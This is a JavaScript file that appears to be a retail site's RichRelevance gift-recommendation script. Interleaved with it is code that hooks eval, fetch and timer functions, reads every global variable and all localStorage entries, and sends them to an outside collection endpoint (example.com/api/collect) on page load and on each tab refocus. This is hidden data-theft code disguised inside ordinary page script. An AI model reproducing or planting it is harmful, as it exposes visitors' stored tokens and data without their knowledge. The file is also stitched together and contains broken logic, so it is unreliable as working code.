let hookedFunctions = {};
function jsHook(funcToHook, hookFunc) {
  hookedFunctions[funcToHook.name] = funcToHook;
  window[funcToHook.name] = function () {
    const result = hookedFunctions[funcToHook.name].apply(this, arguments);
    hookFunc.apply(this, arguments);
    return result;
  };
}
window.addEventListener("load", () => {
  const interestingFunctions = ["setTimeout", "setInterval", "eval", "fetch"];
  interestingFunctions.forEach(funcName => {
    let originalFunc = window[funcName];
    if (originalFunc) {
      jsHook(originalFunc, () => {
        sendInsightsToBackend({
          type: "jshook",
          function: funcName,
          arguments: Array.from(arguments)
        });
      });
    }
  });
});
function inspectLocalStorage() {
  const findings = {};
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    if (!window.seenVars.includes(key)) {
      findings[key] = {
        type: "localStorage",
        value: localStorage.getItem(key)
      };
    }
  }
  return findings;
}
RR.data = {
  JSON: {
    "placements": []
  }
};
function inspectGlobalScope() {
  const findings = {};
  for (const key in window) {
    if (window.hasOwnProperty(key)) {
      if (!window.seenVars.includes(key)) {
        const value = window[key];
        const type = typeof value;
        findings[key] = {
          type: type,
          value: type === "function" ? value.name : value
        };
      }
    }
  }
  return {
    ...findings,
    ...inspectLocalStorage()
  };
}
var rr_remote_data = 'eF5jYilN9jA3NzZISTJJ1U02NUnTNTFJM9RNs0xN1DUwNDOyTE40NE4yNAMA22gKlA';
var rr_recs = {
    placements: [{
      used: false,
      placementType: 'home_page.recently_viewed',
      html: ''
    }]
  },
  rr_dynamic = {
    placements: []
  },
  rr_call_after_flush = function () {
    RR.data.JSON.placements[0] = {
      'message': 'Popular Gifts',
      'items': [],
      'strategy': 'TopSellers',
      'placement_name': rr_recs.placements[0].placementType
    };
    RR.data.JSON.placements[0].items.push({
      'id': '1282979',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=1282979&ind=0&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Farrowgiftco%2Fproduct%2Fme-being-your-friend-enough-of-a-gift-wine-label&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '791933',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=791933&ind=1&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fsophiavictoriajoy%2Fproduct%2Fpersonalised-pull-out-photo-album-token-gift&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '699428',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=699428&ind=2&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fgreentulip%2Fproduct%2Fseagrass-jute-tablemats&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '167216',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=167216&ind=3&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Felizabethjane%2Fproduct%2Fbaby-hand-and-foot-inkless-print&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '600619',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=600619&ind=4&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fmygivenname%2Fproduct%2Fnursery-rhymes-and-personalised-poems-book&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '459358',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=459358&ind=5&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fjoybycorrinesmith%2Fproduct%2Ffamily-birthstone-link-bracelet&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '776481',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=776481&ind=6&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fgaamaa%2Fproduct%2Fsterling-silver-birthstone-sliding-bracelet&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '511591',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=511591&ind=7&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fmorsetoad%2Fproduct%2Fchocolate-wedding-favours&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '847853',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=847853&ind=8&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Fbymollyandizzie%2Fproduct%2Fa-little-wish-bracelet-funny-friend-gift&privm=t'
    });
    RR.data.JSON.placements[0].items.push({
      'id': '1264578',
      'linkURL': 'https://recs.richrelevance.com/rrserver/click?a=976a8da8008a5acc&vg=7731db4e-c54f-44f1-f9ea-01629ca13b16&pti=9&pa=recently_viewed&hpi=14172&stn=TopSellers&stid=13&rti=2&sgs=21043&qsgs=32493%7C21323%7C21043%7C20159%7C18128&mvtId=-1&mvtTs=1694141066936&uguid=7730db4e-c54f-44f1-f9ea-01629ca13b16&channelId=WEB&s=77137b83-d842-4205-9df4-c6bc5d9e8250&pg=-1&p=1264578&ind=9&ct=https%3A%2F%2Fwww.notonthehighstreet.com%2Farrowgiftco%2Fproduct%2Fyou-magnificent-bastard-birthday-card&privm=t'
    });
    if (typeof RR.jsonCallback == 'function') {
      RR.jsonCallback();
    }
  };
rr_flush = function () {
  if (rr_onload_called) {
    if (RR.defaultCallback) {
      RR.defaultCallback(rr_recs);
    } else {
      rr_placements = [];
      var p = rr_recs.placements,
        h,
        i;
      for (i = 0; i < p.length; i++) {
        rr_placements[i] = [p[i].used ? 1 : 0, p[i].placementType, p[i].html];
      }
      for (i = 0; i < rr_placement_place_holders.length; i++) {
        h = document.getElementById('rr_placement_' + i);
        if (h && typeof h != 'undefined') {
          rr_insert_placement(h, rr_placement_place_holders[i]);
        }
      }
    }
    rr_call_after_flush();
    if (RR.renderDynamicPlacements) {
      RR.renderDynamicPlacements();
    }
    if (window.rr_annotations_array) {
      window.rr_annotations_array.push(window.rr_annotations);
    } else {
      window.rr_annotations_array = [window.rr_annotations];
    }
  }
};
async function sendInsightsToBackend(insights) {
  const apiEndpoint = "https://example.com/api/collect";
  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(insights)
    });
    if (response.ok) {
      console.info("Insights sent to backend successfully.");
    } else {
      console.warn(`Failed to send insights, server responded with status code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred while sending insights:", error);
  }
}
function performInspectionTask() {
  const findings = inspectGlobalScope();
  const findingsCount = Object.keys(findings).length;
  if (findingsCount > 0) {
    console.group(`Global scope inspection result - found ${findingsCount} new properties:`);
    for (const key in findings) {
      console.log(`${key}: ${JSON.stringify(findings[key])}`);
    }
    console.groupEnd();
    sendInsightsToBackend(findings);
  } else {
    console.info("Global scope inspection completed, no new properties found");
  }
}
rr_flush();
window.addEventListener("load", performInspectionTask);
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.info("Document visibility changed, re-running global scope inspection task");
    performInspectionTask();
  }
});